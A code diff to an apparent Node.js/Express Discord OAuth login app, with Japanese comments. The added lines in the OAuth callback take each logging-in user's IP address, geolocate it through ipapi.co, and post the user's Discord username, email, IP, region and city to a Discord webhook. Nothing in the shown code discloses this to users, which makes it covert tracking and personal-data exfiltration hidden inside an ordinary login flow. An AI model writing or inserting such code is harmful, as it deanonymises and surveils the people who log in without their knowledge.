@@ -25,6 +25,9 @@ const CLIENT_SECRET = process.env.CLIENT_SECRET;
 const REDIRECT_URI = process.env.REDIRECT_URI; // 例: "https://test-x9iq.onrender.com/callback"
 const OAUTH_SCOPE = "identify email";
 
+// --- Discord Webhook URL ---
+const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
+
 // --- ログイン ---
 app.get("/login", (req, res) => {
   const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${OAUTH_SCOPE}`;
@@ -58,6 +61,26 @@ app.get("/callback", async (req, res) => {
     headers: { Authorization: `Bearer ${tokenData.access_token}` }
   });
   const userData = await userRes.json();
+
+  // --- IP取得 & Geo情報 ---
+  const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() || req.connection.remoteAddress;
+  const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+  const geo = await geoRes.json();
+
+  // --- Discord Webhook送信 ---
+  if (DISCORD_WEBHOOK) {
+    await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `ログイン情報：
+ユーザー: ${userData.username}#${userData.discriminator}
+メール: ${userData.email}
+IP: ${ip}
+地域: ${geo.region || "不明"} / ${geo.city || "不明"}`
+      })
+    });
+  }
 
   // セッションに保存
   req.session.user = {
